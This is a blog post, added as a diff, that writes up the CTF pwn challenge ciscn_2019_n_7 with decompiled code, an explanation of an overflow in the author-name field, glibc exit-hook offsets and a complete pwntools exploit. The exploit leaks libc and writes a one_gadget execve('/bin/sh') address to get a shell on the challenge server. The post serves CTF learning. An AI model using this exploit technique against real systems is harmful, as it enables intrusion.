@@ -1,0 +1,227 @@
+---
+layout: post
+title:  ciscn_2019_n_7
+date:   2022-09-24 00:08:01 +0300
+image:  2022-09-24-cat.jpg
+tags:   [ctf,pwn,ubuntu16,_IO_FILE]
+---
+
+main
+
+```assembly
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  int v3; // eax
+  bool v4; // cc
+
+  sub_CA0(a1, a2, a3);
+LABEL_2:
+  while ( 2 )
+  {
+    while ( 1 )
+    {
+      v3 = sub_D80();
+      v4 = v3 <= 3;
+      if ( v3 != 3 )
+        break;
+LABEL_7:
+      sub_F90();
+    }
+    while ( v4 )
+    {
+      if ( v3 == 1 )
+      {
+        sub_DE0();
+        goto LABEL_2;
+      }
+      if ( v3 != 2 )
+        goto LABEL_11;
+      sub_ED0();
+      v3 = sub_D80();
+      v4 = v3 <= 3;
+      if ( v3 == 3 )
+        goto LABEL_7;
+    }
+    if ( v3 == 4 )
+      sub_1020();
+    if ( v3 == 0x29A )
+    {
+      sub_C50();
+      continue;
+    }
+    break;
+  }
+LABEL_11:
+  puts("NO, Please continue! ");
+  return 0LL;
+}
+```
+
+add
+
+```assembly
+unsigned __int64 add()
+{
+  int v0; // eax
+  _QWORD *v1; // r12
+  char v3[8]; // [rsp+0h] [rbp-28h] BYREF
+  unsigned __int64 v4; // [rsp+8h] [rbp-20h]
+
+  v4 = __readfsqword(0x28u);
+  if ( unk_202014 )
+  {
+    puts("Exists! Now,you can edit your article.");
+  }
+  else
+  {
+    puts("Input string Length: ");
+    read(0, v3, 8uLL);
+    v0 = strtol(v3, 0LL, 0xA);
+    if ( (unsigned __int64)v0 > 0x100 )
+    {
+      puts("Large!");
+    }
+    else
+    {
+      v1 = qword_202018;
+      *qword_202018 = v0;
+      v1[2] = malloc(v0);
+      unk_202014 = 1;
+      puts("Author name:");
+      read(0, qword_202018 + 1, 0x10uLL);
+      puts("Now,you can edit your article.");
+    }
+  }
+  return __readfsqword(0x28u) ^ v4;
+}
+```
+
+这里qword_202018处分别为长度、作者名、内容的指针，read处存在一个溢出，可以修改内容的指针。
+
+edit
+
+```assembly
+int sub_ED0()
+{
+  if ( !unk_202014 )
+    return puts("Dont't exists.");
+  puts("New Author name:");
+  read(0, qword_202018 + 1, 0x10uLL);
+  puts("New contents:");
+  read(0, (void *)qword_202018[2], *qword_202018);
+  return puts("Over.");
+}
+```
+
+show
+
+```assembly
+int sub_F90()
+{
+  int result; // eax
+
+  if ( unk_202014 )
+    result = _printf_chk(1LL, "%s\nAuthor:%s\n", (const char *)qword_202018[2], (const char *)qword_202018 + 8);
+  else
+    result = puts("Dont't exists.");
+  return result;
+}
+```
+
+在main函数中还有一个判断，如果选择为666，这执行sub_C50函数
+
+```assembly
+__int64 sub_C50()
+{
+  return _printf_chk(1LL, "%p\n", &puts);
+}
+```
+
+在 exit 执行过程中，会调用两个函数，一个是`__rtld_lock_lock_recursive`，另一个是`__rtld_lock_unlock_recursive`，要知道这两个函数在 libc-2.23.so 中的偏移。首先`_rtld_global`该结构体和 libc 基地址的偏移是0x5f0040，然后两个钩子函数的偏移在结构体中分别是3848和3856。如果是 debug 版本的 libc ，直接在 gdb 中键入以下命令p _rtld_global来查看该结构体的情况
+
+```assembly
+# libc-2.23.so
+exit_hook = libc_base + 0x5f0040 + 3848
+exit_hook = libc_base + 0x5f0040 + 3856
+
+# libc-2.27.so
+exit_hook = libc_base + 0x619060 + 3840
+exit_hook = libc_base + 0x619060 + 3848
+```
+
+exp
+
+```assembly
+from pwn import *
+
+libc = ELF("./libc-2.23.so")
+
+io = remote("node4.buuoj.cn", 27687)
+
+def add(length, name):
+    io.recvuntil("Your choice->")
+    io.sendline("1")
+    io.recvuntil("Input string Length:")
+    io.sendline(str(length))
+    io.recvuntil("Author name:")
+    io.send(name)
+
+
+def edit(name, content):
+    io.recvuntil("Your choice->")
+    io.sendline("2")
+    io.recvuntil("New Author name:")
+    io.sendline(name)
+    io.recvuntil("New contents:")
+    io.send(content)
+
+
+def show():
+    io.recvuntil("Your choice->")
+    io.sendline("2")
+
+
+io.recvuntil("Your choice->")
+io.sendline("666")
+io.recvline()
+
+addr = io.recvuntil("\n")[:-1]
+addr = int(addr, 16)
+print(hex(addr))
+
+base = addr - libc.symbols["puts"]
+exit_hook = base + 0x5f0040 + 3848
+print(hex(exit_hook))
+add(0x20,'a'*8+p64(exit_hook))
+
+'''
+0x45216 execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4 execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147 execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''
+one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+gadget = base + one_gadget[3]
+
+edit("melody", p64(gadget))
+
+io.sendline("s")
+
+
+# gdb.attach(io)
+# raw_input()
+
+io.interactive()
+```
+
